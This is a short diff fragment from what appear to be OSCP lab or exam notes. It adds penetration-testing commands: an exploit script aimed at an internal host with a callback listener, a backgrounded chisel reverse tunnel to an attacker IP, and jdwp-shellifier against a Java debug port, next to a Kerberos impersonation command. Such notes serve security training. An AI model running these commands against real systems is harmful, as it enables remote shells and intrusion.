@@ -41,15 +41,15 @@ impacket-getST 'oscp.exam/ATTACKER$:Attacker123!' -spn 'cifs/DC01.oscp.exam'-imp
 ```
 
 ```
-
+python3 exploit.py -t 192.168.162.150 -p 8080 -u /search -param query -L 192.168.45.178 -P 4444
 ```
 
 ```
-
+start /b chisel.exe client 192.168.45.178:9999 R:8080:127.0.0.1:8080
 ```
 
 ```
-
+python ./jdwp-shellifier.py -t 192.168.162.150 -p 8000
 ```
 
 ```
